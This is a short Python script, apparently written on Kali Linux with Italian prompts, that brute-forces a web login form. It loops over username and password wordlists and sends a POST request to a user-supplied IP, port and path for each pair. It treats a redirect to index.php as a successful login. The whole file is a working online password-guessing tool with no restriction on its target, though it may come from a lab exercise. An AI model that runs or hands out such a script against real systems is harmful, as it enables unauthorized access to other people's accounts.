import http.client
import urllib.parse
def bruteforce(ip_addr, port, path):

    username_file = open('/home/kali/Scrivania/usernames.lst')
    password_file = open('/home/kali/Scrivania/passwords.lst')

    user_list = username_file.readlines()
    pwd_list = password_file.readlines()

    for user in user_list:
        user = user.rstrip()
        for pwd in pwd_list:
            pwd = pwd.rstrip()

            print(user, "-", pwd)

            post_data = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': "Submit"})
            post_headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}

            conn = http.client.HTTPConnection(f"{ip_addr}", port)
            conn.request("POST", f"{path}", post_data, post_headers)
            response = conn.getresponse()

            if response.getheader('location') == "index.php":
                print("Logged with", user, "", pwd)
                exit()
if __name__ == "__main__":
    ip_addr=input("Inserici l'indirizzo ip target: ")
    port=int(input("inserisci la porta: "))
    path=input("Inserisci il percorso: ")
    bruteforce(ip_addr, port, path)